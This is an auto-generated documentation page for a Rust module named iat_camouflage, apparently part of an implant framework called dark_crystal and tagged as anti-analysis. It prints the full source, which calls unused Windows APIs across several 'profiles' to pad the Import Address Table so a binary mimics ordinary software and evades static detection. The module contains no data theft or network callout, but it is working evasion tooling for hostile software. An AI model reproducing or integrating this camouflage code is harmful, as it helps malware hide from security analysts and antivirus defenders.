# iat_camouflage

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/iat_camouflage.rs` |
| **Lines** | 142 |
| **Cards** | T013-anti-analysis |
| **Role** | IAT camouflage (experimental) |
| **Unsafe blocks** | 3 |
| **Feature gates** | iat_camou |

## Constants

- `PROFILE_3_MASK`: `u8` = `1 << 0`
- `PROFILE_4_MASK`: `u8` = `1 << 1`
- `PROFILE_5_MASK`: `u8` = `1 << 2`

## Public API

### `apply` (line 14)
```rust
pub fn apply()
```

### `apply` (line 46)
```rust
pub fn apply()
```

### `apply` (line 89)
```rust
pub fn apply()
```

### `apply_camouflage` (line 117)
```rust
pub fn apply_camouflage(profile: usize)
```

## Internal Functions

- `GetDeviceCaps` (line 8)
- `timeGetTime` (line 12)
- `InternetOpenA` (line 26)
- `InternetCloseHandle` (line 33)
- `CertOpenStore` (line 37)
- `CertCloseStore` (line 44)
- `CoInitializeEx` (line 76)
- `CoUninitialize` (line 77)
- `SHGetFolderPathW` (line 81)

## Full Source

```rust
#[cfg(feature = "iat_camou")]
use std::sync::Mutex;

#[cfg(feature = "iat_camou")]
mod profile_3 {
    #[link(name = "gdi32")]
    extern "system" {
        fn GetDeviceCaps(hdc: *mut core::ffi::c_void, index: i32) -> i32;
    }
    #[link(name = "winmm")]
    extern "system" {
        fn timeGetTime() -> u32;
    }
    pub fn apply() {
        unsafe {
            let _ = timeGetTime();
            let _ = GetDeviceCaps(core::ptr::null_mut(), 0);
        }
    }
}

#[cfg(feature = "iat_camou")]
mod profile_4 {
    #[link(name = "wininet")]
    extern "system" {
        fn InternetOpenA(
            lpszAgent: *const i8,
            dwAccessType: u32,
            lpszProxy: *const i8,
            lpszProxyBypass: *const i8,
            dwFlags: u32,
        ) -> *mut core::ffi::c_void;
        fn InternetCloseHandle(hInternet: *mut core::ffi::c_void) -> i32;
    }
    #[link(name = "crypt32")]
    extern "system" {
        fn CertOpenStore(
            lpszStoreProvider: *const i8,
            dwEncodingType: u32,
            hCryptProv: usize,
            dwFlags: u32,
            pvPara: *const core::ffi::c_void,
        ) -> *mut core::ffi::c_void;
        fn CertCloseStore(hCertStore: *mut core::ffi::c_void, dwFlags: u32) -> i32;
    }
    pub fn apply() {
        unsafe {
            let h = InternetOpenA(
                b"Mozilla/5.0\0".as_ptr() as *const i8,
                0,
                core::ptr::null(),
                core::ptr::null(),
                0,
            );
            if !h.is_null() {
                InternetCloseHandle(h);
            }
            let store = CertOpenStore(
                b"System\0".as_ptr() as *const i8,
                0,
                0,
                0x2000,
                core::ptr::null(),
            );
            if !store.is_null() {
                CertCloseStore(store, 0);
            }
        }
    }
}

#[cfg(feature = "iat_camou")]
mod profile_5 {
    #[link(name = "ole32")]
    extern "system" {
        fn CoInitializeEx(pvReserved: *mut core::ffi::c_void, dwCoInit: u32) -> i32;
        fn CoUninitialize();
    }
    #[link(name = "shell32")]
    extern "system" {
        fn SHGetFolderPathW(
            hwnd: *mut core::ffi::c_void,
            csidl: i32,
            hToken: *mut core::ffi::c_void,
            dwFlags: u32,
            pszPath: *mut u16,
        ) -> i32;
    }
    pub fn apply() {
        unsafe {
            let hr = CoInitializeEx(core::ptr::null_mut(), 0);
            let should_uninitialize = hr >= 0;
            let mut path = [0u16; 260];
            let _ = SHGetFolderPathW(
                core::ptr::null_mut(),
                0,
                core::ptr::null_mut(),
                0,
                path.as_mut_ptr(),
            );
            if should_uninitialize {
                CoUninitialize();
            }
        }
    }
}

#[cfg(feature = "iat_camou")]
const PROFILE_3_MASK: u8 = 1 << 0;
#[cfg(feature = "iat_camou")]
const PROFILE_4_MASK: u8 = 1 << 1;
#[cfg(feature = "iat_camou")]
const PROFILE_5_MASK: u8 = 1 << 2;
#[cfg(feature = "iat_camou")]
static APPLIED_MASK: Mutex<u8> = Mutex::new(0);

pub fn apply_camouflage(profile: usize) {
    #[cfg(feature = "iat_camou")]
    {
        let requested_mask = match profile {
            3 => PROFILE_3_MASK,
            4 => PROFILE_3_MASK | PROFILE_4_MASK,
            5 => PROFILE_3_MASK | PROFILE_4_MASK | PROFILE_5_MASK,
            _ => PROFILE_4_MASK,
        };

        let mut applied = APPLIED_MASK.lock().unwrap();

        if requested_mask & PROFILE_3_MASK != 0 && *applied & PROFILE_3_MASK == 0 {
            profile_3::apply();
            *applied |= PROFILE_3_MASK;
        }
        if requested_mask & PROFILE_4_MASK != 0 && *applied & PROFILE_4_MASK == 0 {
            profile_4::apply();
            *applied |= PROFILE_4_MASK;
        }
        if requested_mask & PROFILE_5_MASK != 0 && *applied & PROFILE_5_MASK == 0 {
            profile_5::apply();
            *applied |= PROFILE_5_MASK;
        }
    }
}

```